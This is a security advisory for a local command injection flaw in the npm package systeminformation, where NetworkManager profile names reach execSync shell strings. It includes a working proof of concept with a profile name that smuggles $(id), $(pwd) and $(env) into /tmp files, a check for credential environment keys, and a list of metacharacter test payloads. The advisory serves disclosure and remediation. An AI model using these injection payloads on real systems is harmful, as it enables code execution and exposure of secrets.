# [H] Systeminformation vulnerable to Linux command injection in networkInterfaces() via unsanitized NetworkManager connection profile name

## Summary
Severity: High
Advisory: GHSA-hvx9-hwr7-wjj9
CVE: CVE-2026-44724
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-13
Source: https://github.com/advisories/GHSA-hvx9-hwr7-wjj9
Type: github-advisory

## Affected
- npm: `systeminformation` — affected >=4.17.0 <5.31.6

## Details
## Summary

On Linux, `systeminformation` is vulnerable to command injection in `networkInterfaces()` when an **active NetworkManager connection profile name** contains shell metacharacters.

This is not caused by a caller passing attacker-controlled arguments into `networkInterfaces()`. The vulnerable value is obtained internally from real `nmcli device status` output. The library sanitizes the network interface name before using it in shell commands, but it does **not** apply equivalent sanitization to the parsed NetworkManager connection profile name. That unsanitized `connectionName` is then interpolated into three shell command strings executed through `execSync()`.

This issue was validated locally against **real NetworkManager** and **real `nmcli`**. Calling only:

```js
require('./lib').networkInterfaces()
```

was enough to trigger execution. The injected command ran with the privileges of the calling Node.js process.

## Affected Component & Versions

**Affected component:**

- [`lib/network.js`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js)
- `networkInterfaces()`
- Linux NetworkManager / `nmcli` handling


## Impact & Threat Model

**Confirmed impact:**

An attacker who can create or rename an **active NetworkManager connection profile** can execute arbitrary shell commands when a Node.js process using `systeminformation` calls `networkInterfaces()`.

**Confirmed realistic affected deployments include:**

- local inventory agents
- monitoring agents
- diagnostics tools
- admin dashboard backends collecting host information
- privileged local desktop or device-management agents

If such a process runs with elevated privileges, the injected command executes with those same elevated privileges.

**Confirmed facts:**

- The payload was stored as a real NetworkManager connection profile name.
- Real `nmcli device status` returned the name unchanged.
- `networkInterfaces()` parsed that value and reused it in shell commands.
- The injected command ran as the calling Node.js process.
- Environment key categories were reachable from the injected process context.

**Not claimed:**

- No remote exploitation claim is made.
- No `AV:N` or `AV:A` claim is made.
- No SSID-to-connection-name attack path is claimed.
- File-delivery-only `.nmconnection` import was not confirmed as a remote or unauthenticated path.

## Root Cause Analysis

The root cause is inconsistent trust handling between the Linux interface name and the NetworkManager connection profile name.

The interface name is sanitized before it is embedded into shell commands:

```js
const iface = dev.split(':')[0].trim();
const s = util.isPrototypePolluted() ? '---' : util.sanitizeShellString(iface);
```

However, the NetworkManager connection name is parsed from command output and later reused without equivalent sanitization:

```js
const connectionNameLines = resultFormat.split(' ').slice(3);
const connectionName = connectionNameLines.join(' ');
return connectionName !== '--' ? connectionName : '';
```

That is unsafe because NetworkManager profile names can contain shell metacharacters. Quoting the value inside `"${connectionName}"` does not make it safe. A connection name containing `"`, `$()`, `;`, backticks, or similar shell syntax can break out of the intended argument context or trigger command substitution.

The vulnerable code executes through `execSync()`, which invokes a shell for command strings. As a result, interpolating `connectionName` into the command string creates a command-injection sink.

## Exact Code Flow & File Paths

**Source:** [`lib/network.js:538-544`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L538-L544)

```js
function getLinuxIfaceConnectionName(interfaceName) {
  const cmd = `nmcli device status 2>/dev/null | grep ${interfaceName}`;

  try {
    const result = execSync(cmd, util.execOptsLinux).toString();
    const resultFormat = result.replace(/\s+/g, ' ').trim();
    const connectionNameLines = resultFormat.split(' ').slice(3);
```

The parsed value is then returned as `connectionName`.

**Trigger:** [`lib/network.js:987-991`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L987-L991)

```js
lines = execSync(cmd, util.execOptsLinux).toString().split('\n');
const connectionName = getLinuxIfaceConnectionName(ifaceSanitized);
dhcp = getLinuxIfaceDHCPstatus(ifaceSanitized, connectionName, _dhcpNics);
dnsSuffix = getLinuxIfaceDNSsuffix(connectionName);
ieee8021xAuth = getLinuxIfaceIEEE8021xAuth(connectionName);
```

**Sink 1:** [`lib/network.js:620`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L620-L620)

```js
const cmd = `nmcli connection show "${connectionName}" 2>/dev/null | grep ipv4.method;`;
```

**Sink 2:** [`lib/network.js:660`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L660-L660)

```js
const cmd = `nmcli connection show "${connectionName}" 2>/dev/null | grep ipv4.dns-search;`;
```

**Sink 3:** [`lib/network.js:676`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L676-L676)

```js
const cmd = `nmcli connection show "${connectionName}" 2>/dev/null | grep 802-1x.eap;`;
```

There are **three distinct exploitable `connectionName` sinks**.


## Proof of Concept (PoC) & Reproduction Steps

The following PoC is harmless and local-only. It uses a dummy NetworkManager connection and writes proof files under /tmp.

Run from the project root:

```bash
cd /path/to/systeminformation
```

Confirm proof files do not already exist:

```bash
test -e /tmp/si-nm-id-proof && echo EXISTS || echo NOT_YET
test -e /tmp/si-nm-pwd-proof && echo EXISTS || echo NOT_YET
test -e /tmp/si-nm-env-proof && echo EXISTS || echo NOT_YET
```

Create a malicious NetworkManager dummy profile:

```bash
nmcli connection add type dummy ifname si-nmghsa0 con-name 'si-ghsa$(id>/tmp/si-nm-id-proof)$(pwd>/tmp/si-nm-pwd-proof)$(env>/tmp/si-nm-env-proof)'
```

Assign a documentation-only address so Node’s os.networkInterfaces() sees the dummy interface:

```bash
nmcli connection modify 'si-ghsa$(id>/tmp/si-nm-id-proof)$(pwd>/tmp/si-nm-pwd-proof)$(env>/tmp/si-nm-env-proof)' \
  ipv4.method manual \
  ipv4.addresses 192.0.2.253/32 \
  ipv6.method disabled
```

Activate the profile:

```bash
nmcli connection up 'si-ghsa$(id>/tmp/si-nm-id-proof)$(pwd>/tmp/si-nm-pwd-proof)$(env>/tmp/si-nm-env-proof)'
```

Confirm real nmcli exposes the malicious connection name unchanged:

```bash
nmcli device status | grep si-nmghsa0
```

Expected relevant output includes the active connection name:

```text
si-nmghsa0  dummy  connected  si-ghsa$(id>/tmp/si-nm-id-proof)$(pwd>/tmp/si-nm-pwd-proof)$(env>/tmp/si-nm-env-proof)
```

Trigger the vulnerable library path with no attacker-controlled function argument:

```bash
node -e "const si=require('./lib'); si.networkInterfaces().then((interfaces)=>{const item=interfaces.find((entry)=>entry.iface==='si-nmghsa0'); console.log('saw_dummy_iface=' + Boolean(item)); if (item)
console.log(JSON.stringify({iface:item.iface, ip4:item.ip4, dhcp:item.dhcp, dnsSuffix:item.dnsSuffix, ieee8021xAuth:item.ieee8021xAuth}));}).catch((e)=>{console.error(e); process.exit(1);});"
```

Confirm command execution:

```bash
test -e /tmp/si-nm-id-proof && echo CONFIRMED || echo FAILED
cat /tmp/si-nm-id-proof
cat /tmp/si-nm-pwd-proof
```

Inspect environment key categories without printing secret values:

```bash
node -e "
const fs=require('fs');
const keys=fs.readFileSync('/tmp/si-nm-env-proof','utf8')
  .split(/\n/).map(l=>l.split('=')[0]).filter(Boolean);
const wanted=['PATH','USER','HOME','SHELL','PWD','SSH_AUTH_SOCK','GITHUB_TOKEN','NPM_TOKEN','AWS_ACCESS_KEY_ID'];
console.log('env_key_count='+keys.length);
console.log('present_categories='+wanted.filter(k=>keys.includes(k)).join(','));
"
```

validated evidence:

```text
saw_dummy_iface=true
uid=1000(smart) gid=1000(smart)
pwd=/home/smart/Downloads/systeminformation-master
env_key_count=74
present_categories=PATH,USER,HOME,SHELL,PWD,SSH_AUTH_SOCK
```

## Local Validation Summary & Aggregate Reachability

Validation was performed against **real NetworkManager** and **real `nmcli`**. The primary proof did not rely on a PATH stub.

**Observed behavior:**

- The malicious profile was accepted by NetworkManager.
- The active connection name appeared unchanged in `nmcli device status`.
- Calling only `require('./lib').networkInterfaces()` triggered execution.
- The proof artifacts were created only after the library call.
- The `id` output matched the calling Node.js process identity.
- The `pwd` output matched the Node.js process working directory.
- The environment proof demonstrated access to process-environment categories without printing secret values.

**Aggregate API reachability:**

- [`lib/index.js:94`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/index.js#L94-L94): `getStaticData()` reaches `network.networkInterfaces()` as part of static data collection.
- [`lib/index.js:307`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/index.js#L307-L307): `getAllData()` reaches `getStaticData()` first.

During local validation, an aggregate runtime attempt later hit an unrelated `osinfo.js` error in that environment. Because of that, aggregate source reachability is confirmed, but aggregate call completion was **not** used as the primary exploit proof.

## Why This Is Not Intended Behavior

`networkInterfaces()` is documented and expected to return network interface metadata such as interface name, IP addresses, DHCP state, DNS suffix, and IEEE 802.1X status.

The library already shows an intent to protect shell command construction by sanitizing interface names before shell use. The missing sanitization for `connectionName` is inconsistent with that defensive pattern.

Executing shell commands embedded in a NetworkManager profile name is not a documented feature, not required to return network metadata, and not an expected design tradeoff. This is a command injection vulnerability caused by unsafe shell-string construction.

## Recommended Fix

Avoid shell interpolation entirely for NetworkManager calls.

Replace shell command strings with `execFileSync()` or `spawnSync()` using argument arrays. For example:

```js
const { execFileSync } = require('child_process');

const output = execFileSync(
  'nmcli',
  ['connection', 'show', connectionName],
  util.execOptsLinux
).toString();
```

**Recommended code-level changes:**

- Replace `nmcli device status 2>/dev/null | grep ${interfaceName}` with argument-array execution and filter rows in JavaScript.
- Replace every `nmcli connection show "${connectionName}" | grep ...` shell string with argument-array execution.
- Parse `ipv4.method`, `ipv4.dns-search`, and `802-1x.eap` in JavaScript instead of using shell `grep`.
- Treat NetworkManager profile names as untrusted input even though they originate from local system state.
- Do not rely on quoting or escaping as the main mitigation. Argument-array execution is the correct fix.

## Regression Test Ideas

Add Linux-specific tests for NetworkManager connection names containing shell metacharacters.

**Suggested malicious connection names:**

- `name$(...)`
- `name"; ...; #`
- ``name`...``` 
- `name|...`
- `name;...`

**Expected behavior after the fix:**

- `networkInterfaces()` completes without executing shell syntax from the connection name.
- No marker files or equivalent side effects are produced.
- The function either returns metadata for the interface or safely returns unknown/default values for fields that cannot be queried.
- Tests cover all three current sink helpers:
  - DHCP lookup
  - DNS suffix lookup
  - IEEE 802.1x auth lookup

For unit-level coverage, mock the NetworkManager command wrapper so that `nmcli device status` returns a connection name containing metacharacters, then assert that subsequent calls use argument arrays rather than shell strings.

## Credit request
If you publish an advisory or assign a CVE, please credit me as:

Ali Firas (thesmartshadow)  - https://www.smartshadow.dev

## References
- https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-hvx9-hwr7-wjj9
- https://nvd.nist.gov/vuln/detail/CVE-2026-44724
- https://github.com/sebhildebrandt/systeminformation
- https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.31.6
